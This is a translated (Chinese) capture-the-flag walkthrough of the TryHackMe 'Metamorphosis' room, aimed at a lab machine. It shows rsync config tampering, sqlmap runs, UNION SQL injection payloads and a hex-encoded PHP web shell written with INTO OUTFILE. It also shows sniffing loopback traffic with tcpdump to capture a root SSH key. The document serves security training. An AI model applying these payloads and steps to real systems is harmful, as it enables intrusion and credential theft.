<html>
<head>
<title>TryHackMe: Metamorphosis</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe:变形</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-metamorphosis-81e1db375056?source=collection_archive---------1-----------------------#2021-05-12">https://infosecwriteups.com/tryhackme-metamorphosis-81e1db375056?source=collection_archive---------1-----------------------#2021-05-12</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/5900de439a568dee463eac71046e143a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CHJR3OK8xiA2hDFIS8yrfg.png"/></div></div></figure><h1 id="7497" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">最初的立足点</h1><p id="1290" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">通过进行Nmap扫描，我们可以让服务在机器上运行。</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="47c4" class="md jz iq lz b gy me mf l mg mh">PORT    STATE SERVICE     VERSION<br/>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 f7:0f:0a:18:50:78:07:10:f2:32:d1:60:30:40:d4:be (RSA)<br/>|   256 5c:00:37:df:b2:ba:4c:f2:3c:46:6e:a3:e9:44:90:37 (ECDSA)<br/>|_  256 fe:bf:53:f1:d0:5a:7c:30:db:ac:c8:3c:79:64:47:c8 (ED25519)<br/>80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))<br/>|_http-server-header: Apache/2.4.29 (Ubuntu)<br/>|_http-title: Apache2 Ubuntu Default Page: It works<br/>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br/>445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br/>873/tcp open  rsync       (protocol version 31)<br/>Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><span id="13b7" class="md jz iq lz b gy mi mf l mg mh">Host script results:<br/>|_clock-skew: mean: 0s, deviation: 1s, median: 0s<br/>|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br/>| smb-os-discovery: <br/>|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br/>|   Computer name: incognito<br/>|   NetBIOS computer name: INCOGNITO\x00<br/>|   Domain name: \x00<br/>|   FQDN: incognito<br/>|_  System time: 2021-04-17T15:35:53+00:00<br/>| smb-security-mode: <br/>|   account_used: guest<br/>|   authentication_level: user<br/>|   challenge_response: supported<br/>|_  message_signing: disabled (dangerous, but default)<br/>| smb2-security-mode: <br/>|   2.02: <br/>|_    Message signing enabled but not required<br/>| smb2-time: <br/>|   date: 2021-04-17T15:35:53<br/>|_  start_date: N/A</span></pre><p id="86d0" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">首先，我们检查机器上运行的web服务，我们得到了ubuntu的默认页面，如果你在域上进行目录强制，你会发现它有一个管理端点，但当我们去的时候，它显示403禁止，当我们检查源代码时，它说。</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="0f85" class="md jz iq lz b gy me mf l mg mh"><strong class="lz ir">&lt;html&gt; &lt;head&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/head&gt;&lt;! — Make sure admin functionality can only be used in development environment. →&lt;/html&gt;</strong></span></pre><p id="2fab" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">这意味着我们目前处于生产环境中，我们必须想办法进入生产环境。为此，我们可以检查其他服务。所以我们有了Rsync和Rsync，Rsync用于通过比较文件的修改时间和大小，在计算机和外部硬盘之间以及联网的计算机之间传输和同步文件。</p><p id="4a94" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">所以让我们看看通过Rsync可以得到的dir</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="7718" class="md jz iq lz b gy me mf l mg mh">└─$ rsync -av rsync://10.10.130.243/                                                                    <br/>Conf            All Confs</span></pre><p id="1698" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在检查Conf目录中的文件</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mp"><img src="../Images/a24a5e2d012d04d1e48355294240b415.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tZhQ4cynPI4Jc1mtKhuJkA.png"/></div></div></figure><p id="010b" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">同步/下载Conf目录中的文件，因为该功能通过Rsync服务同步文件。</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="543a" class="md jz iq lz b gy me mf l mg mh">rsync -a "rsync://IP/Conf" ./</span></pre><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mq"><img src="../Images/a97fbfbc73c31bb0617c1603fa4a4c13.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rJrnonI0FHeKnXzAL4jRrQ.png"/></div></div></figure><p id="002e" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">这里我们有服务器使用的“<strong class="ky ir"> webapp.ini </strong>”文件，我们可以在其中指定“开发”环境，并将webapp.ini文件与服务器同步</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="fb0f" class="md jz iq lz b gy me mf l mg mh">rsync ./webapp.ini "rsync://IP/Conf/webapp.ini"</span></pre><p id="8cca" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在我们可以访问'<a class="ae mr" href="http://10.10.242.95/admin/" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 242 . 95/admin/</a>'</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/3b47a4df56034caec4a56a009c5a3cf8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*q3vAm6t-Ird62ZxmeKGYFQ.png"/></div></div></figure><p id="59a1" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">为了识别Sqli的有效负载，我们将首先捕获burp中的请求并保存该请求。</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="5a4a" class="md jz iq lz b gy me mf l mg mh">POST /admin/config.php HTTP/1.1<br/>Host: 10.10.176.232<br/>Content-Length: 13<br/>Cache-Control: max-age=0<br/>Upgrade-Insecure-Requests: 1<br/>Origin: <a class="ae mr" href="http://10.10.176.232" rel="noopener ugc nofollow" target="_blank">http://10.10.176.232</a><br/>Content-Type: application/x-www-form-urlencoded<br/>User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br/>Sec-GPC: 1<br/>Referer: <a class="ae mr" href="http://10.10.176.232/admin/" rel="noopener ugc nofollow" target="_blank">http://10.10.176.232/admin/</a><br/>Accept-Encoding: gzip, deflate<br/>Accept-Language: en-GB,en-US;q=0.9,en;q=0.8<br/>Connection: close</span><span id="888c" class="md jz iq lz b gy mi mf l mg mh">username=x3rz</span></pre><p id="3d1a" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">保存后，我们将使用sqlmap运行它。</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="4320" class="md jz iq lz b gy me mf l mg mh">sqlmap -r sqli.request -p username --risk 3 --level 5</span></pre><p id="64c9" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">这将向我们显示webapp中的负载和漏洞名称。</p><p id="4d00" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">有效载荷:</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="6fe4" class="md jz iq lz b gy me mf l mg mh">x3rz" UNION ALL SELECT NULL,NULL,CONCAT(0x717a7a7871,0x437257454b476461616b5a705266745776585066456576576b4665426e63624d774a45575475474d,0x717a766a71)-- -</span></pre><p id="9131" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">基本上有3列。现在让我们通过使用user()、version()或database()内置的SQL函数来找出易受攻击的列。</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="a09d" class="md jz iq lz b gy me mf l mg mh">x3rz" UNION ALL SELECT version(),user(),database() -- -</span></pre><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/01b9ce8674feafcd6668fd31c6bcba4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1136/format:webp/1*Cvuy9z3wWSF7a3hHI1VwCQ.png"/></div></figure><p id="0fe3" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">所以它给出了user()和database()输出，所以第2列和第3列容易受到攻击。</p><p id="abde" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在让我们得到我们的RCE。</p><figure class="lu lv lw lx gt jr"><div class="bz fp l di"><div class="mu mv l"/></div></figure><p id="b174" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">对于RCE，我们将按照易受攻击的列将PHP代码写入文件。</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="5795" class="md jz iq lz b gy me mf l mg mh">print (("&lt;? system($_GET['cmd’]); ?&gt;").encode('utf-8').hex())<br/>3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e</span></pre><p id="03ca" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">这是我们的PHP代码的十六进制，我们这样做是为了绕过过滤，所以它不会改变我们的有效载荷文件的内容。</p><p id="3b10" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">有效载荷:</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="d4ce" class="md jz iq lz b gy me mf l mg mh">x3rz" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/revshell.php"-- -</span></pre><p id="3aae" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在让我们访问实例<a class="ae mr" href="http://10.10.46.175/revshell.php?cmd=id" rel="noopener ugc nofollow" target="_blank">上的有效负载http://10 . 10 . 46 . 175/revshell . PHP</a></p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mw"><img src="../Images/f151d47f33caefcb18fb859ffe0b2141.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_rZs7xx_iCn3P1WlebkJzA.png"/></div></div></figure><p id="e686" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">我们做了RCE现在时间进入盒子，为此我们必须执行netcat或任何rev shell命令的python，ruby，PHP，或任何东西，但在我的情况下，这些不工作，所以我尝试了另一种方法，我下载了pentester猴子反向外壳到机器上使用wget，并从机器上获得反向连接。</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mx"><img src="../Images/f43b2f297998fa4938ec28393d7214b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lb_qvdUdmpEGYPVqHmJj3Q.png"/></div></div></figure><p id="4ecf" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">现在，我们必须开始在机器内部进行枚举，以找到将引导我们找到系统根的东西。我做了基本的枚举，如SUID位、检查备份和功能。在功能中，我们发现了一些不常见的东西，那就是tcpdump。</p><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="45c6" class="md jz iq lz b gy me mf l mg mh">getcap -r / 2&gt;/dev/null</span><span id="087b" class="md jz iq lz b gy mi mf l mg mh">/usr/sbin/tcpdump = cap_net_raw+ep</span></pre><p id="16c4" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">如果我们在机器上执行linpeas，我们还会发现127.0.0.1:1024 ( python)上的一些活跃的互联网连接(服务器和已建立的连接),并且linpeas还会告诉我们可以通过tcpdump进行监听。但是对于tcpdump，我们必须指定我们必须嗅探的接口，因为我们已经知道一些服务正在127.0.0.1上运行，因此我们必须嗅探<strong class="ky ir"> localhost接口(环回)</strong>。我们不知道接口缩写，只要做ifconfig，你就会在那里找到它，即<strong class="ky ir"> lo </strong>。</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi my"><img src="../Images/6cafac87fb9c9c6d664a76452009a541.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G3rk8s0j18lF2csv0Hu2rQ.png"/></div></div></figure><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mz"><img src="../Images/05b821124c201631bbe5255c105c8e09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LC5pKb-kVuaOFFmgZ7Hz3Q.png"/></div></div></figure><pre class="lu lv lw lx gt ly lz ma mb aw mc bi"><span id="9323" class="md jz iq lz b gy me mf l mg mh">tcpdump -A -n -i lo -vvv</span></pre><p id="ea70" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">等待一段时间，我们得到了ssh私有密钥，我试着用它作为root登录，它成功了。我们终于扎根了。</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi na"><img src="../Images/8df8aa9a6d606d6163752a71a906c70d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1348/format:webp/1*Yj-no-JvVlBzwr2O7RQiPg.png"/></div></div><figcaption class="nb nc gj gh gi nd ne bd b be z dk translated">SSH私钥</figcaption></figure><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/b6bec7cd12757cbaa164f2b0fbbd78dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1384/format:webp/1*XuGo2vZohFSIFtTWNxrB8Q.png"/></div><figcaption class="nb nc gj gh gi nd ne bd b be z dk translated">根</figcaption></figure><p id="d6e1" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated"><strong class="ky ir">奖励:</strong>根目录下多了两个文件。一个是req.sh，另一个是serv.py。因此serv.py是托管在127.0.0.1:1024上的flask应用程序，它具有私钥，系统持续执行req.sh，它将curl请求发送到flask服务器，如果admin的值正确，它将返回我们的私钥。</p><figure class="lu lv lw lx gt jr gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/8accfedfbf8966945aaa3b4575b6b35f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1324/format:webp/1*CZyiUOAvvwqtNtTfm5NH1g.png"/></div></figure><p id="49b9" class="pw-post-body-paragraph kw kx iq ky b kz mj lb lc ld mk lf lg lh ml lj lk ll mm ln lo lp mn lr ls lt ij bi translated">感谢阅读😄</p></div></div>    
</body>
</html>